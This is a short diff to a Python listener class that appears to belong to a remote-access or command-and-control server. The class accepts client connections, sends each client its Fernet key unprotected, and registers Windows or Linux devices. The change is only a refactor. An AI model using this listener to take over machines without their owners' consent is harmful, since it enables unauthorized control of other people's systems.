@@ -45,11 +45,14 @@ class Listener(Base_Listener):
             except Exception:
                 exit()
             else:
-                self.key = Fernet.generate_key()
-                self.fernet = Fernet(self.key)
+                key = Fernet.generate_key()
+                self.fernet = Fernet(key)
+                try:
+                    connection.send(key)
+                except:
+                    continue
                 log(
                     f"New Connection established from {addr[0]}", alert="success")
-                connection.send(self.key)
                 try:
                     operating_system = self.decrypt(
                         connection.recv(1024)).lower()
@@ -60,10 +63,10 @@ class Listener(Base_Listener):
                     continue
                 if operating_system == "windows":
                     self.add_device(
-                        Windows(connection, addr[0], self.key, self.server.active_devices_count + 1))  # Create a Windows Object to store the connection
+                        Windows(connection, addr[0], key, self.server.active_devices_count + 1))  # Create a Windows Object to store the connection
                 elif operating_system == "linux":
                     self.add_device(
-                        Linux(connection, addr[0], self.key, self.server.active_devices_count + 1))  # Create a Linux Object to store the connection
+                        Linux(connection, addr[0], key, self.server.active_devices_count + 1))  # Create a Linux Object to store the connection
                 else:
                     log(f"Unknown Operating System: {operating_system}",
                         alert="error")
@@ -77,7 +80,6 @@ class Listener(Base_Listener):
         except:
             raise Exception("Port is already in use.")
         self.listener.listen()
-
         # Start the Listener and Refresher
         self.listener_thread = threading.Thread(
             target=self.listen, name="Listener " + str(self.id))
@@ -99,5 +101,5 @@ class Listener(Base_Listener):
             bool: True if socket is running, False if not
             bool: True if listener is running, False if not
             bool: True if refresher is running, False if not"""
-        # Return the Status of the Server
+        # Return the Status of the Listener
         return self.stopped, self.listener_thread.is_alive(), self.refresher_thread.is_alive()
